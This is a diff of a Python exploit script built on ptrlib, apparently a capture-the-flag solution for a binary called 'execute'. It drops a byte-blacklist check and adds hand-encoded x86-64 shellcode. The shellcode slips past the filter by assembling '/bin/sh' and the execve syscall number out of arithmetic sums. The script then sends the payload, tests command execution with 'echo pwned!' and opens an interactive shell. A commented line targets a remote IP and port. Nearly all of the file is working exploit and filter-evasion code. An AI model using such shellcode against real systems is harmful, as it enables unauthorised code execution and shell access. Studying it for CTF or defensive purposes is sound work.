@@ -4,26 +4,84 @@ import ptrlib as ptr
 
 elf = ptr.ELF("./execute")
 io = ptr.Process(elf.filepath)
+# io = ptr.Socket("83.136.254.13", 45233)
 
 
-def check(shellcode: bytes):
-    # blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"
-    blacklist = [59, 84, 98, 105, 110, 115, 104, 246, 210, 192, 95, 201, 102, 108, 97, 103]
-    for byte in shellcode:
-        if byte in blacklist:
-            return [False, byte]
-    return [True, None]
-
-# shellcode1 = b"\x48\x31\xC0\x48\x31\xFF\x48\x31\xF6\x48\xC7\xC7\x00\x00\x00\x00\xBA\x3C\x00\x00\x00\x48\x8D\x45\xB0\x48\x89\xC6\xE8\x00\x00\x00\x00"
-shellcode = b"\x48\x31\xFF\x48\x31\xF6\x48\x31\xD2\x48\x31\xDB\xBA\x3C\x00\x00\x00\x48\x8D\x5D\xB0\x48\x89\xDE\xE8\x00\x00\x00\x00\x48\x8D\x45\xB0\xFF\xD0"
-result = check(shellcode)
-if not result[0]:
-    ptr.logger.error(b"shellcode check failed " + chr(result[1]).encode())
+def to_shellcode(array: list[int]):
+    shellcode = b""
+    for i in array:
+        shellcode += bytes([i])
+    return shellcode
 
 
-# io.sendline(shellcode1)
+code = [
+    0x48,
+    0xC7,
+    0xC3,
+    0x00,
+    0x00,
+    0x00,
+    0x00,  # mov rbx, 0
+    0x48,
+    0x89,
+    0xDA,  # mov rdx, rbx
+    0x48,
+    0x89,
+    0xDE,  # mov rsi, rbx
+    0x48,
+    0xB8,
+    0x20,
+    0x60,
+    0x60,
+    0x60,
+    0x20,
+    0x70,
+    0x60,
+    0x00,  # mov rax, 0x60702060606020
+    0x48,
+    0xBB,
+    0x0F,
+    0x02,
+    0x09,
+    0x0E,
+    0x0F,
+    0x03,
+    0x08,
+    0x00,  # mov rbx, 0x08030f0e09020f
+    0x48,
+    0x01,
+    0xD8,  # add rax, rbx
+    0x48,
+    0x89,
+    0x45,
+    0x90,  # mov [rbp-0x70], rax
+    0x48,
+    0xC7,
+    0xC3,
+    0x30,
+    0x00,
+    0x00,
+    0x00,  # mov rbx, 0x30
+    0x48,
+    0x83,
+    0xC3,
+    0x0B,  # add rbx, 0xb
+    0x48,
+    0x89,
+    0xD8,  # mov rax, rbx
+    0x48,
+    0x8D,
+    0x7D,
+    0x90,  # lea rdi, [rbp-0x70]
+    0x0F,
+    0x05,  # syscall
+]
 
-# with open("./payload", "wb") as f:
-# f.write(shellcode1)
 
+payload = to_shellcode(code)
+ptr.logger.info(f"payload length: {len(payload)}")
+
+io.sendline(payload)
+io.sendline("echo pwned!")
+io.recvuntil("pwned!")
 io.sh()
